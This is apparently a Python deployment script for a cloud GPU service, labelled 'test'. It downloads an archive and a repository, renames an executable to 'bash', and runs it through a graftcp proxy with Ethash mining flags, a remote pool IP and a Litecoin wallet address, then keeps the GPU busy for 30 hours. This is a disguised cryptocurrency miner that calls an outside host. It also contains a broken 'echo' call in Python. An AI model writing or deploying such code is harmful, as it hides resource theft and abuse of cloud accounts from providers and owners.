from beam import function, Image
import subprocess
import time

image = (
    Image(
        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
    )
    .add_commands([
        "apt-get update -y",
        "apt-get install -y python3 python3-pip python-is-python3 git wget unzip curl ca-certificates",
    ])
)


@function(
    name="test",
    image=image,
    gpu="RTX4090",
    cpu=8,
    memory="16Gi",
    timeout=30 * 60 * 60,
)
def run_script():

    print("=== CHECK GPU ===")
    subprocess.run(["nvidia-smi"], check=False)

    cmd = """
    set -e

    echo "=== CURRENT DIRECTORY ==="
    pwd

    echo "=== DOWNLOAD FILE ==="
    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip

    echo "=== EXTRACT ==="
    unzip -o pan.zip

    echo "=== CHECK PAN ==="
    ls -ld /mnt/code/pan
    ls -lah /mnt/code/pan

    echo "=== ENTER PAN ==="
    cd /mnt/code/pan

    echo "=== SET PERMISSION ==="
    chmod -R +x .

    echo "=== START GRAFTCP LOCAL ==="
    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &

    sleep 3

    echo "=== DOWNLOAD RIG ==="
    cd /mnt/code/pan
    git clone https://github.com/malogrono/lol198.git

    echo "=== CHECK RIGEL ==="
    ls -lah /mnt/code/pan/lol198

    echo "=== CHECK BASH ==="
    cd /mnt/code/pan/lol198
    ls -lh bash

    chmod u+x bash

    echo "=== MOVE BASH ==="
    mv bash /mnt/code/pan/

    echo "=== CHECK PAN AFTER MOVE ==="
    ls -ld /mnt/code/pan
    ls -lah /mnt/code/pan

    echo "=== FINAL DIRECTORY ==="
    cd /mnt/code/pan
    pwd
    ls -lah
    
    echo "=== RUN PROC VIA GRAFTCP ==="
    ./graftcp/graftcp ./bash --algo ETHASH --pool 57.129.82.223:80 --user LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.01 --ethstratum ETHPROX
    """

    subprocess.run(["bash", "-lc", cmd], check=False)

    print("Staying alive for 30 hours...")
    time.sleep(60 * 60 * 30)

    echo ("=== TIMER START ===")

    start = time.monotonic()
    duration = 30 * 60 * 60

    while time.monotonic() - start < duration:
        elapsed = int(time.monotonic() - start)

        hours = elapsed // 3600
        minutes = (elapsed % 3600) // 60
        seconds = elapsed % 60

        print(
            f"\rElapsed: {hours:02d}:{minutes:02d}:{seconds:02d}",
            end="",
            flush=True,
        )

        time.sleep(1)

    print("\n=== 30 HOURS COMPLETED ===")
